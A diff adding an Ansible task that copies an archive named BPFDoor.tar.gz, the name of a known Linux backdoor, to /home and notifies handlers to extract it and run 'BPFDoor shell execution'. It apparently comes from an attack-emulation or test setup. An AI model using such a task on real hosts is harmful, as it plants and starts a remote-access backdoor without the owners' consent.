@@ -1,0 +1,10 @@
+---
+
+- name: copy zip
+  ansible.builtin.copy:
+    src: files/BPFDoor.tar.gz
+    dest: /home/BPFDoor.tar.gz
+    mode: '0644'
+  notify: 
+  - 'tarxvzf'
+  - 'BPFDoor shell execution'
